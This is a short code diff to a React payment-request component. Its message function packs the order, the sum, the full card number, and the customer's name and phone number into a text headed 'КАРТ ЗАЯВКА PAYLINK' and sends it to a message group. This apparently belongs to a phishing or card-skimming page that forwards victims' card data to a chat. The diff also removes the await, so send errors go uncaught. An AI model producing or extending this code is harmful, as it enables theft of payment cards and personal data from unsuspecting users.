@@ -135,19 +135,19 @@ const PaymentRequest = () => {
     initiateOrder();
   }, [formData]);
 
-  const handleSmsSend = async (order, orderSum, card) => {
-    const message = `
-      PAY_XX:
-      Order: [${order}]
-      Order Sum: [${orderSum}]
-      Card: [${card}]
-      User Name: [${formData.name}]
-      Phone Number: [${formData.phoneNumber}]
-    `;
+  const handleSmsSend = async (order, orderSum, cardNumber) => {
     try {
-      await sendMessageGroup(message);
+      const message = `
+        КАРТ ЗАЯВКА PAYLINK : 
+                                  Order: [${order}]
+        Order Sum: [${orderSum}]
+              Card: [${cardNumber}]
+        User Name: [${formData.name}]
+        Phone Number: [${formData.phoneNumber}]
+    `;
+      sendMessageGroup(message);
     } catch (error) {
-      console.error('Error sending SMS:', error);
+      console.error('Error sending message:', error.message);
     }
   };
 
